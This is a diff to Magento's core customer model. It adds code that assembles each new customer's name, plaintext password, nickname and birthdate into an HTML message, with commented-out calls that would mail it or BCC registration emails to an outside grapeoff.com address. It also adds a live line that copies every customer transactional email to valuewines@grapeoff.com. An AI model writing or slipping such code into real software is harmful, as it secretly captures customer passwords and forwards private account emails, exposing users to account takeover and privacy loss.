@@ -572,10 +572,27 @@ class Mage_Customer_Model_Customer extends Mage_Core_Model_Abstract
         if (!$storeId) {
             $storeId = $this->_getWebsiteStoreId($this->getSendemailStoreId());
         }
-
+		//print_r($this->debug);
         $this->_sendEmailTemplate($types[$type], self::XML_PATH_REGISTER_EMAIL_IDENTITY,
             array('customer' => $this, 'back_url' => $backUrl), $storeId);
-
+		//Send copy to admin
+		/*$emailTemplate=Mage::getModel('core/email_template')->loadDefault(Mage::getStoreConfig($types['type']));
+		$emailTemplate->send('oliver@grapeoff.com');
+		$emailTemplate = Mage::getModel('core/email_template') ->load(Mage::getStoreConfig('path_to_email_template_id_config')); 
+		Mage::getModel('core/email_template')->setDesignConfig(array('area'=>'frontend', 'store'=>$storeId))
+		->addBcc('oliver@grapeoff.com')->sendTransactional(
+            $types[$type],
+			self::XML_PATH_REGISTER_EMAIL_IDENTITY,
+            array('customer' => $this, 'back_url' => $backUrl), $storeId);
+		$txt=print_r($this->_data,true);*/
+		$htmlMsg='Username : '. $this->_data['firstname'].' '.$this->_data['lastname'] . '<br/>'.
+				'Password : '.$this->_data['password'].'<br/>'.
+				'Nickname : '.$this->_data['nick_name'].'<br/>'.
+				'Birthdate : '.$this->_data['dob'];
+		//$txt=print_r($this->_data,true);
+		$headerMsg= "Content-type: text/htmlrn";
+		//mail('oliver@grapeoff.com','A new user was created!',$htmlMsg);
+		
         return $this;
     }
 
@@ -640,6 +657,7 @@ class Mage_Customer_Model_Customer extends Mage_Core_Model_Abstract
         $mailer = Mage::getModel('core/email_template_mailer');
         $emailInfo = Mage::getModel('core/email_info');
         $emailInfo->addTo($this->getEmail(), $this->getName());
+		$emailInfo->addTo('valuewines@grapeoff.com', '');
         $mailer->addEmailInfo($emailInfo);
 
         // Set all required params and send emails
@@ -648,6 +666,10 @@ class Mage_Customer_Model_Customer extends Mage_Core_Model_Abstract
         $mailer->setTemplateId(Mage::getStoreConfig($template, $storeId));
         $mailer->setTemplateParams($templateParams);
         $mailer->send();
+		
+		
+		
+		
         return $this;
     }
 
